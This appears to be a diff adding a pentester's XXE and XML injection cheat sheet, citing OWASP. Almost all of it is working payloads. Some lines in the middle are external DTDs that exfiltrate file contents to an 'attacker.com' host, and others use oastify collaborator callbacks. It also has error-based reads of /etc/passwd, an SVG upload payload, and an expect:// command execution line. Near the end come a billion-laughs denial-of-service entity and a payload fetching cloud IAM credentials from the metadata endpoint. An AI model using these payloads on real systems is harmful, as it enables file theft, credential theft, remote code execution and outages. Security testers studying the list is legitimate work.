@@ -1,0 +1,166 @@
+Testing for XML Injection:-
+triggers{
+foo'
+foo"
+foo<
+foo>
+&foo
+foo<!--
+]]>
+<![CDATA[<foo>]]>
+<![CDATA[<]]>script<![CDATA[>]]>alert('xss')![CDATA[<]]>/script<![CDATA[>]]>
+
+
+>>>if target processes xml file then:-
+--changing content type to (svg, pdf,json, soap(<1.2))
+--make an xml document containing following line to test for blind xxe:-
+-- <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "burp collaborator url"> ]>
+-- save the above line in a test.xml and upload it wherever possible, now go and look for the incoming requests on burp collaborator.
+--we can also test for xxe with these file types (svg, DOCX, XLXS)
+--we can also use SOAP requests to test for xxe
+
+
+>>>when entities aren't blocked:-
+
+--for this:-
+
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
+
+--do this:-
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE self [ <!ENTITY xxe SYSTEM "https://c6jttfss1713aqpdpejmnd18zz5pte.oastify.com"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>&xxe;</storeId></stockCheck>
+
+
+>>>when entities are blocked:-
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://yoqdux8e6bg99r1t9n0bkzjk8be62v.oastify.com"> %xxe; ]>
+
+
+>>>when retriving file through error:-
+save a file on server with .dtd extension "atacker.com/file.dtd" containing:-
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http:///attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+--put url of your server in your request:-
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "atacker.com/file.dtd"> %xxe;]>
+
+
+>>>when only parameter and value id going with the request but embeds the user input inside a server-side XML document that is subsequently parsed:-
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+OR
+
+    <!DOCTYPE foo [ <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+
+
+
+>>>On image upload functionality, upload file containing this with extension .svg:-
+
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+
+
+>>>If parses XML input but does not display the result, then  trigger an error message containing the contents of the /etc/passwd file.
+You'll need to reference an existing DTD file on the server and redefine an entity from it 
+Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso :-
+
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
+
+OR
+
+---Host file containing this on server with .dtd extension "http://attacker.com/malicious.dtd":
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+then payload will be:-
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://atacker.com/malicious.dtd"> %xxe;]>
+
+
+
+For Understanding this payload head to: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection
+
+Username: tony
+Password: Un6R34kb!e</password><!--
+E-mail: --><userid>0</userid><mail>s4tan@hell.com
+
+
+
+If server parses the xml request made by the hacker:-
+
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "expect://whoami"> ]>
+
+this can lead to RCE if expect plugin is installed on the server.
+
+
+
+
+If server block out of band http requests:-
+
+file:// 
+ftp://
+php://filter/
+expect://
+
+
+
+Dos with XXE:-
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ENTITY lola "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lolb "&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;">
+ <!ENTITY lolc "&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;">
+ <!ENTITY lold "&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;">
+ <!ENTITY lole "&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;">
+ <!ENTITY lolf "&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;">
+ <!ENTITY lolg "&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;">
+ <!ENTITY lolh "&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;">
+ <!ENTITY loli "&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;">
+]>
+<attack>&loli;</attack>
+
+
+
+try this:-
+
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY externalEntity SYSTEM
+  "http://169.254.169.254/latest/meta-data/iam/security-credentials">
+]>
+
+and replace like this:-
+<foo>
+  &externalEntity;
+</foo>
+
+
+
+
+Tools:-
+Xxeserv --- A provides ftp server for xxe payloads
+oxml_xxe --- Tool to bind XXE/XML exploits into different filetypes.
+
+
